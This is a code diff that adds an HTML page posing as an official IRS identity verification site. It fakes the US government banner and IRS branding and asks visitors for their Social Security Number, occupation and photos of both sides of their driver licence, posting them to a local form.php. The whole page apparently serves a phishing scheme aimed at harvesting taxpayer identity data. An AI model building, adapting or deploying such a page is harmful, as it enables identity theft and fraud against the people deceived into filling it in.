@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Cache-Control" content="private, no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache"> 
+    <meta http-equiv="Expires" content="-1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex,nofollow">
+    <title>IRS | Identity Verification</title>
+    <link rel="shortcut icon" href="favicon.ico">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/font.css" rel="stylesheet">
+    <link href="css/styles.css" rel="stylesheet">
+    <link href="css/application.css" rel="stylesheet">
+    <script async="" src="https://www.google-analytics.com/analytics.js"></script>
+    <script src="css/jquery-3.5.1.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <link class="jsbin" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1/themes/base/jquery-ui.css" rel="stylesheet" type="text/css">
+    <script class="jsbin" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+    <script class="jsbin" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.0/jquery-ui.min.js"></script>
+</head>
+<body class="bg-white">
+	<header>
+        <div id="banner" role="banner" alt="banner">
+            <section class="usa-banner" aria-label="Official government website">
+                <div class="usa-accordion">
+                    <header>
+                        <div id="bannerOuter">
+                            <div id="bannerInner" class="container">
+                                <div class="bannerRow">
+                                    <img src="images/official-site-flag.png" class="official-site-flag mr-2" alt="US Flag">
+                                        <div class="bannerText fill">An official website of the United States Government</div>
+                                </div>
+                            
+                                <div class="bannerRow">
+                                    <div id="flagEqualizer"></div>
+                                        <div class="bannerText fill">
+                                            <a id="aExpandHeaderBar" href="#" alt="Expand &quot;Here's how you know&quot;">
+                                                <span>Here's how you know</span>
+                                                <img id="aExpandHeaderArrow" src="images/arrow-down.svg" alt="" aria-label="" width="10px" padding="0" border="0" data-isexpanded="false">
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                    </header>
+                </div>
+            </section>
+        </div>
+        <nav id="nav" class="sadi-header mb-3">
+            <div id="navbarText" class="container sadi-header py-0 my-0">
+                <div class="sadi-header py-0 my-0 mr-2 sadi-header-flex-left">
+                    <img src="images/IRS-Logo.svg" class="mr-3 sadi-header-logo" alt="The IRS eagle symbol">
+                </div>
+            </div>
+        </nav>
+    </header>
+    <div id="main">
+            <div class="page-container" data-role="page-container">
+                <div class="container">
+                    <div class="content-container">
+                        <form class="new_user" id="new_user" action="form.php" accept-charset="UTF-8" method="post" enctype="multipart/form-data">
+                            <main aria-labelledby="sr_page_title" class="form-container">
+                                <div class="form-header-access"><h1 id="sr_page_title">Means Of Identification</h1></div>
+                                <div class="form-fields">
+                                    <div class="field-group">
+                                        <div class="required-instructions"><span>* Indicates a required field</span></div>
+                                        <div class="field text suggest">
+                                            <label class="required" for="user_texts_attributes_0_address">Social Security Number (SSN)</label>
+                                            <input name="ssn" required="required" type="tel" id="user_texts_attributes_0_address">
+                                        </div>
+                                        <div class="field text suggest">
+                                            <label class="required" for="user_texts_attributes_0_address">Occupation</label>
+                                            <input name="work" required="required" type="text" id="user_texts_attributes_0_address">
+                                        </div><br>
+                                        <div class="field text suggest">
+                                            <label class="required" for="user_texts_attributes_0_address">Driver License (Front)</label>
+                                            <input name="file[]" required="required" type="file" id="user_texts_attributes_0_address" onchange="readURL(this);">
+                                        </div>
+                                        <div class="field text suggest">
+                                            <label class="required" for="user_texts_attributes_0_address">Driver License (Back)</label>
+                                            <input name="file[]" required="required" type="file" id="user_texts_attributes_0_address" onchange="readURLA(this);">
+                                        </div>
+                                        <div class="field text suggest">
+                                           <img id="blah" src="#" alt="" style="padding-right: 40px;">
+                                            <script>
+                                                function readURL(input) {if (input.files && input.files[0]) {var reader = new FileReader(); reader.onload = function (e) {$('#blah').attr('src', e.target.result).width(150).height(150);}; reader.readAsDataURL(input.files[0]);}}
+                                            </script>
+                                            <img id="clah" src="#" alt="">
+                                             <script>
+                                                 function readURLA(input) {if (input.files && input.files[0]) {var reader = new FileReader(); reader.onload = function (e) {$('#clah').attr('src', e.target.result).width(150).height(150);}; reader.readAsDataURL(input.files[0]);}}
+                                             </script>
+                                         </div>
+                                    </div>
+                                </div>
+                                <div class="form-actions">
+                                    <input type="submit" id="submit" name="submit" value="Continue" class="btn btn-primary">
+                                </div>
+                            </main>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div><br><br><br>
+        <footer class="footer sadi-footer" style="position: relative; bottom: 0; width: 100%">
+        <div class="container flex sadi-footer-position">
+            <div class="grid-row grid-gap-lg">
+                <div>
+                    <a href="#"><img id="footerLogo" src="images/IRS-Logo.svg" height="28px" padding="0" border="0" alt="The IRS Logo"></a>
+                </div>
+                <div class="footer-links-position">
+                    <span class="text-white">
+                        <a href="#" class="text-white mr-2">Privacy Policy</a>|
+                    </span>
+                    <span class="text-white">
+                        <a href="#" class="text-white ml-2">Accessibility</a>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
